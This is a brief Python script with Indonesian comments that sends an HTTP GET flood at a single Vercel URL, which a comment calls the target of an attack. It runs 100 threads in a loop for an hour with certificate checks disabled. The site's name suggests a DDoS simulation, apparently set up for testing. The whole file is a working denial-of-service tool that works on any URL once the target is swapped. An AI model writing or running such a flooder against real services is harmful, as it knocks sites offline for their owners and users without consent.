import requests
import threading
import time
import logging

# URL yang akan diserang
url = "https://simulasi-ddos-4jd8.vercel.app/"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def send_request(stop_event):
    while not stop_event.is_set():
        try:
            # Kirimkan permintaan GET ke URL
            response = requests.get(url, verify=False)  # Nonaktifkan verifikasi SSL
            # Tampilkan status kode untuk debugging
            logging.info(f"Status Code: {response.status_code}")
        except requests.RequestException as e:
            # Tampilkan pesan kesalahan jika permintaan gagal
            logging.error(f"Request failed: {e}")
    
# Jumlah thread yang akan digunakan untuk mengirim permintaan
num_threads = 100

# Durasi pengujian dalam detik
duration = 3600  # 3600 detik = 1 jam

# Buat event untuk menghentikan thread
stop_event = threading.Event()

# Buat dan jalankan thread
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_request, args=(stop_event,))
    thread.start()
    threads.append(thread)

# Tunggu selama durasi yang ditentukan
time.sleep(duration)

# Hentikan semua thread
stop_event.set()

# Tunggu semua thread selesai
for thread in threads:
    thread.join()

logging.info("Pengujian selesai.")
